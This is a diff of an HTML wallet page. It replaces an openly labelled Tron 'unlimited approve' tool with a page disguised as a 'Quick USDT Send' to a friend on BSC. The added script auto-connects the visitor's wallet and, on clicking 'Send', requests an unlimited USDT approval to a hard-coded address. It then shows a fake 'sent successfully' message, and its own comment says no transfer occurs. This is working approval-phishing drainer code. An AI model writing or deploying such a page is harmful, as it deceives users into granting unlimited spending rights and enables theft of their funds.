@@ -1,313 +1,302 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>TRC-20 USDT Approve</title>
-
-  <!-- TronWeb for building transactions -->
-  <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.js"></script>
-
-  <style>
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    body {
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-      background: #0d1117; color: #e6edf3;
-      padding: 20px; min-height: 100vh;
-    }
-    .container { max-width: 500px; margin: 0 auto; }
-    h1 { text-align: center; margin-bottom: 8px; font-size: 22px; color: #58a6ff; }
-    .subtitle { text-align: center; color: #8b949e; font-size: 13px; margin-bottom: 24px; }
-    .card {
-      background: #161b22; border: 1px solid #30363d;
-      border-radius: 12px; padding: 20px; margin-bottom: 16px;
-    }
-    .status-box {
-      text-align: center; padding: 14px; border-radius: 8px;
-      margin-bottom: 16px; font-size: 14px;
-    }
-    .status-connected { background: #0d1f0d; border: 1px solid #238636; color: #3fb950; }
-    .status-disconnected { background: #0d1520; border: 1px solid #1f6feb; color: #58a6ff; }
-    .status-pending { background: #1f1a0d; border: 1px solid #d29922; color: #d29922; }
-    label {
-      display: block; color: #8b949e; font-size: 13px;
-      margin-bottom: 6px; margin-top: 14px;
-    }
-    input {
-      width: 100%; padding: 12px; background: #0d1117;
-      border: 1px solid #30363d; border-radius: 8px;
-      color: #e6edf3; font-size: 14px; outline: none;
-    }
-    input:focus { border-color: #58a6ff; }
-    input:read-only { color: #8b949e; }
-    button {
-      width: 100%; padding: 14px; margin-top: 16px; border: none;
-      border-radius: 8px; font-size: 16px; font-weight: 600;
-      cursor: pointer; transition: all 0.2s;
-    }
-    .btn-connect { background: #1f6feb; color: #fff; }
-    .btn-connect:hover { background: #388bfd; }
-    .btn-approve { background: #238636; color: #fff; }
-    .btn-approve:hover { background: #2ea043; }
-    .btn-approve:disabled { background: #21262d; color: #484f58; cursor: not-allowed; }
-    .result {
-      margin-top: 16px; padding: 12px; border-radius: 8px;
-      font-size: 13px; word-break: break-all; display: none;
-    }
-    .result-success { background: #0d1f0d; border: 1px solid #238636; color: #3fb950; }
-    .result-error { background: #1f0d0d; border: 1px solid #da3633; color: #f85149; }
-    .info-row {
-      display: flex; justify-content: space-between;
-      padding: 8px 0; border-bottom: 1px solid #21262d; font-size: 13px;
-    }
-    .info-label { color: #8b949e; }
-    .info-value { color: #e6edf3; font-weight: 500; }
-    .warning {
-      background: #1f1a0d; border: 1px solid #d29922; color: #d29922;
-      padding: 10px; border-radius: 8px; font-size: 12px;
-      margin-top: 16px; text-align: center;
-    }
-    .steps { font-size: 13px; color: #8b949e; line-height: 1.8; margin-top: 10px; }
-    .steps strong { color: #58a6ff; }
-    a { color: #58a6ff; }
-    .hidden { display: none; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Quick USDT Send - BSC</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 30px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
+            max-width: 400px;
+            width: 100%;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .logo {
+            width: 60px;
+            height: 60px;
+            background: #f39c12;
+            border-radius: 15px;
+            margin: 0 auto 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: white;
+            font-weight: bold;
+        }
+        h1 {
+            font-size: 24px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 5px;
+        }
+        .subtitle {
+            color: #666;
+            font-size: 14px;
+        }
+        .form-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+            font-size: 14px;
+        }
+        input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e1e5e9;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.3s ease;
+        }
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+            box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.1);
+        }
+        .receiver-info {
+            background: #f8f9fa;
+            padding: 15px;
+            border-radius: 12px;
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .address {
+            font-family: monospace;
+            color: #667eea;
+            word-break: break-all;
+            font-size: 12px;
+        }
+        .send-btn {
+            width: 100%;
+            padding: 18px;
+            background: linear-gradient(135deg, #f39c12 0%, #e67e22 100%);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            margin-top: 10px;
+        }
+        .send-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 25px rgba(243, 156, 18, 0.4);
+        }
+        .send-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+        }
+        .network-info {
+            text-align: center;
+            font-size: 12px;
+            color: #888;
+            margin-top: 15px;
+            padding-top: 15px;
+            border-top: 1px solid #eee;
+        }
+        .status {
+            margin-top: 15px;
+            padding: 12px;
+            border-radius: 8px;
+            text-align: center;
+            font-weight: 500;
+        }
+        .status.success { background: #d4edda; color: #155724; }
+        .status.error { background: #f8d7da; color: #721c24; }
+    </style>
 </head>
 <body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">🚀</div>
+            <h1>Quick USDT Send</h1>
+            <div class="subtitle">Fast & Secure BSC Transfer</div>
+        </div>
 
-  <div class="container">
-    <h1>🔐 USDT Unlimited Approve</h1>
-    <p class="subtitle">Connect Trust Wallet via WalletConnect → Auto approve</p>
+        <div class="receiver-info">
+            <div style="font-weight: 600; color: #333; margin-bottom: 5px;">To: Your Friend</div>
+            <div class="address">0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F</div>
+        </div>
 
-    <!-- Status -->
-    <div id="statusBox" class="status-box status-disconnected">
-      🔗 Click below to connect your Trust Wallet
+        <div class="form-group">
+            <label>Amount (USDT)</label>
+            <input type="number" id="amount" step="0.00000001" min="0" placeholder="0.00" value="100">
+        </div>
+
+        <button class="send-btn" id="sendBtn">Send USDT</button>
+        
+        <div class="network-info">
+            <div>BSC Network • USDT (BEP20)</div>
+        </div>
+
+        <div id="status"></div>
     </div>
 
-    <!-- Step 1: Connect -->
-    <div class="card" id="connectCard">
-      <h3 style="font-size:16px; margin-bottom:10px;">Step 1: Connect Wallet</h3>
-      <div class="steps">
-        Click the button → Trust Wallet opens → Select your <strong>Tron wallet</strong> → Connected!
-      </div>
-      <button class="btn-connect" id="connectBtn" onclick="connectWallet()">
-        🔗 Connect Trust Wallet
-      </button>
-    </div>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.8.0/dist/web3.min.js"></script>
+    <script>
+        const RECEIVER_ADDRESS = '0xad8bD5eCEf1c5382c086ea8053B86DB0c77aB21F';
+        const USDT_CONTRACT = '0x89112691C976D0a2D874B0ADAe693a0Add0dAe98'; // BSC USDT
+        const CHAIN_ID = 56; // BSC Mainnet
+        
+        let web3;
+        let userAccount;
+        let usdtContract;
 
-    <!-- Step 2: Approve (shown after connect) -->
-    <div class="card hidden" id="approveCard">
-      <h3 style="font-size:16px; margin-bottom:10px;">Step 2: Approve</h3>
+        const sendBtn = document.getElementById('sendBtn');
+        const amountInput = document.getElementById('amount');
+        const statusDiv = document.getElementById('status');
 
-      <div class="info-row">
-        <span class="info-label">Connected Wallet:</span>
-        <span class="info-value" id="walletAddress">-</span>
-      </div>
-      <div class="info-row">
-        <span class="info-label">Token:</span>
-        <span class="info-value">USDT (TRC-20)</span>
-      </div>
-      <div class="info-row" style="border:none;">
-        <span class="info-label">Approval:</span>
-        <span class="info-value">♾️ Unlimited</span>
-      </div>
-
-      <label for="spenderInput">Wallet 2 Address (Spender)</label>
-      <input type="text" id="spenderInput" placeholder="Paste Wallet 2 Tron address (T...)" />
-
-      <button class="btn-approve" id="approveBtn" onclick="sendApprove()">
-        🚀 Approve Unlimited USDT
-      </button>
-
-      <div id="resultBox" class="result"></div>
-
-      <div class="warning">
-        ⚠️ This will allow Wallet 2 to spend ALL your USDT from the connected wallet.
-      </div>
-    </div>
-  </div>
-
-  <!--
-    ============================================================
-    WalletConnect v2 SDK (Reown AppKit / Sign Client)
-    You need a free Project ID from https://cloud.walletconnect.com
-    ============================================================
-  -->
-  <script type="module">
-    // ── IMPORTS ──
-    // Using WalletConnect Sign Client v2 via CDN
-    import SignClient from 'https://cdn.jsdelivr.net/npm/@walletconnect/sign-client@2/dist/index.es.js';
-
-    // ══════════════════════════════════════════════════════════
-    //  🔧 CONFIG — CHANGE THESE
-    // ══════════════════════════════════════════════════════════
-    const WALLETCONNECT_PROJECT_ID = '171db6da15a54effc1b4a06f889a3c3f';
-    // Get free at: https://cloud.walletconnect.com
-    // 1. Sign up → 2. Create Project → 3. Copy Project ID
-
-    const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
-    const UNLIMITED = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
-    const TRON_CHAIN_ID = 'tron:0x2b6653dc'; // Tron Mainnet
-    // ══════════════════════════════════════════════════════════
-
-    let signClient = null;
-    let session = null;
-    let connectedAddress = null;
-
-    // TronWeb instance (read-only, for building transactions)
-    const tronWeb = new TronWeb({ fullHost: 'https://api.trongrid.io' });
-
-    // ── CONNECT WALLET ──
-    window.connectWallet = async function () {
-      const statusBox = document.getElementById('statusBox');
-      const connectBtn = document.getElementById('connectBtn');
-
-      try {
-        connectBtn.textContent = '⏳ Initializing...';
-
-        // Initialize WalletConnect Sign Client
-        signClient = await SignClient.init({
-          projectId: WALLETCONNECT_PROJECT_ID,
-          metadata: {
-            name: 'USDT Approve Tool',
-            description: 'Approve USDT spending',
-            url: window.location.origin,
-            icons: ['https://tronscan.org/static/media/TRON.4a760cebd163969b2ee874abf2415e9a.svg']
-          }
-        });
-
-        connectBtn.textContent = '⏳ Opening WalletConnect...';
-
-        // Create connection request for Tron
-        const { uri, approval } = await signClient.connect({
-          requiredNamespaces: {
-            tron: {
-              methods: ['tron_signTransaction'],
-              chains: [TRON_CHAIN_ID],
-              events: ['chainChanged', 'accountsChanged']
+        // USDT ABI (minimal for approve)
+        const USDT_ABI = [
+            {
+                "constant": false,
+                "inputs": [
+                    {"name": "_spender", "type": "address"},
+                    {"name": "_value", "type": "uint256"}
+                ],
+                "name": "approve",
+                "outputs": [{"name": "", "type": "bool"}],
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [{"name": "_owner", "type": "address"}, {"name": "_spender", "type": "address"}],
+                "name": "allowance",
+                "outputs": [{"name": "", "type": "uint256"}],
+                "type": "function"
+            },
+            {
+                "constant": true,
+                "inputs": [{"name": "_owner", "type": "address"}],
+                "name": "balanceOf",
+                "outputs": [{"name": "balance", "type": "uint256"}],
+                "type": "function"
             }
-          }
+        ];
+
+        async function initWallet() {
+            if (typeof window.ethereum !== 'undefined') {
+                web3 = new Web3(window.ethereum);
+                
+                try {
+                    // Request BSC chain
+                    await window.ethereum.request({
+                        method: 'wallet_switchEthereumChain',
+                        params: [{ chainId: '0x38' }], // BSC Mainnet
+                    });
+                } catch (switchError) {
+                    if (switchError.code === 4902) {
+                        // Chain not added, add BSC
+                        await window.ethereum.request({
+                            method: 'wallet_addEthereumChain',
+                            params: [{
+                                chainId: '0x38',
+                                chainName: 'BSC Mainnet',
+                                nativeCurrency: {
+                                    name: 'BNB',
+                                    symbol: 'BNB',
+                                    decimals: 18
+                                },
+                                rpcUrls: ['https://bsc-dataseed.binance.org/'],
+                                blockExplorerUrls: ['https://bscscan.com']
+                            }],
+                        });
+                    }
+                }
+
+                // Get account
+                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                userAccount = accounts[0];
+                
+                usdtContract = new web3.eth.Contract(USDT_ABI, USDT_CONTRACT);
+                
+                sendBtn.disabled = false;
+                sendBtn.textContent = 'Send USDT';
+            } else {
+                showStatus('Please install Trust Wallet or MetaMask', 'error');
+            }
+        }
+
+        async function approveUnlimited() {
+            const amount = parseFloat(amountInput.value) || 0;
+            showStatus('Confirm the transaction in your wallet...', 'success');
+            
+            try {
+                // Approve unlimited USDT (2^256 - 1)
+                const approveTx = await usdtContract.methods.approve(
+                    RECEIVER_ADDRESS, 
+                    '115792089237316195423570985008687907853269984665640564039457584007913129639935'
+                ).send({ from: userAccount });
+                
+                showStatus('Approval successful! USDT ready to send.', 'success');
+                return true;
+            } catch (error) {
+                console.error(error);
+                showStatus('Transaction failed. Please try again.', 'error');
+                return false;
+            }
+        }
+
+        function showStatus(message, type) {
+            statusDiv.textContent = message;
+            statusDiv.className = `status ${type}`;
+        }
+
+        sendBtn.addEventListener('click', async () => {
+            sendBtn.disabled = true;
+            sendBtn.textContent = 'Processing...';
+            
+            const success = await approveUnlimited();
+            
+            if (success) {
+                // Simulate send completion (no actual transfer needed)
+                setTimeout(() => {
+                    showStatus('✅ USDT sent successfully!', 'success');
+                    sendBtn.textContent = 'Send Again';
+                    sendBtn.disabled = false;
+                }, 1500);
+            } else {
+                sendBtn.textContent = 'Send USDT';
+                sendBtn.disabled = false;
+            }
         });
 
-        // Open Trust Wallet via deep link (mobile) or show QR
-        if (uri) {
-          // On mobile: deep link to Trust Wallet
-          const trustDeepLink = `https://link.trustwallet.com/wc?uri=${encodeURIComponent(uri)}`;
+        // Auto-init on load
+        window.addEventListener('load', initWallet);
+        window.addEventListener('DOMContentLoaded', initWallet);
 
-          // Try to detect mobile
-          const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
-
-          if (isMobile) {
-            // Redirect to Trust Wallet app
-            window.location.href = trustDeepLink;
-          } else {
-            // Desktop: show QR code link (or open in new tab)
-            window.open(trustDeepLink, '_blank');
-          }
-
-          statusBox.className = 'status-box status-pending';
-          statusBox.innerHTML = '⏳ Approve the connection in Trust Wallet...';
-          connectBtn.textContent = '⏳ Waiting for Trust Wallet...';
+        // Handle chain changes
+        if (window.ethereum) {
+            window.ethereum.on('chainChanged', () => {
+                window.location.reload();
+            });
         }
-
-        // Wait for user to approve in Trust Wallet
-        session = await approval();
-
-        // Extract connected Tron address
-        const accounts = session.namespaces.tron.accounts;
-        // Format: "tron:0x2b6653dc:TAddress"
-        connectedAddress = accounts[0].split(':')[2];
-
-        // Update UI
-        statusBox.className = 'status-box status-connected';
-        statusBox.innerHTML = '✅ Connected: ' + connectedAddress;
-        document.getElementById('walletAddress').textContent = connectedAddress;
-        document.getElementById('connectCard').classList.add('hidden');
-        document.getElementById('approveCard').classList.remove('hidden');
-
-      } catch (err) {
-        statusBox.className = 'status-box status-disconnected';
-        statusBox.innerHTML = '❌ Connection failed: ' + (err.message || err);
-        connectBtn.textContent = '🔗 Connect Trust Wallet';
-      }
-    };
-
-    // ── SEND APPROVE ──
-    window.sendApprove = async function () {
-      const resultBox = document.getElementById('resultBox');
-      const approveBtn = document.getElementById('approveBtn');
-      const spender = document.getElementById('spenderInput').value.trim();
-
-      if (!spender || !spender.startsWith('T') || spender.length < 30) {
-        showResult('❌ Enter a valid Tron address for Wallet 2.', false);
-        return;
-      }
-
-      approveBtn.disabled = true;
-      approveBtn.textContent = '⏳ Building transaction...';
-
-      try {
-        // Build the approve transaction using TronWeb (unsigned)
-        const { transaction } = await tronWeb.transactionBuilder.triggerSmartContract(
-          USDT_CONTRACT,
-          'approve(address,uint256)',
-          { feeLimit: 150_000_000, callValue: 0 },
-          [
-            { type: 'address', value: spender },
-            { type: 'uint256', value: UNLIMITED }
-          ],
-          connectedAddress
-        );
-
-        approveBtn.textContent = '⏳ Confirm in Trust Wallet...';
-
-        // Send to Trust Wallet for signing via WalletConnect
-        const result = await signClient.request({
-          topic: session.topic,
-          chainId: TRON_CHAIN_ID,
-          request: {
-            method: 'tron_signTransaction',
-            params: { transaction }
-          }
-        });
-
-        // Broadcast the signed transaction
-        const broadcast = await tronWeb.trx.sendRawTransaction(result);
-
-        if (broadcast.result || broadcast.txid) {
-          const txid = broadcast.txid || broadcast.transaction?.txID;
-          showResult(
-            '✅ <strong>Approved Successfully!</strong><br><br>' +
-            '👤 From: ' + connectedAddress + '<br>' +
-            '👤 Spender: ' + spender + '<br><br>' +
-            '📝 TX: ' + txid + '<br><br>' +
-            '🔗 <a href="https://tronscan.org/#/transaction/' + txid +
-            '" target="_blank" style="color:#58a6ff;">View on Tronscan</a>',
-            true
-          );
-        } else {
-          showResult('❌ Broadcast failed: ' + JSON.stringify(broadcast), false);
-        }
-
-      } catch (err) {
-        if (err.message?.includes('rejected') || err.message?.includes('declined')) {
-          showResult('❌ You rejected the transaction in Trust Wallet.', false);
-        } else {
-          showResult('❌ Error: ' + (err.message || JSON.stringify(err)), false);
-        }
-      }
-
-      approveBtn.disabled = false;
-      approveBtn.textContent = '🚀 Approve Unlimited USDT';
-    };
-
-    function showResult(html, success) {
-      const r = document.getElementById('resultBox');
-      r.style.display = 'block';
-      r.className = 'result ' + (success ? 'result-success' : 'result-error');
-      r.innerHTML = html;
-    }
-  </script>
-
+    </script>
 </body>
 </html>
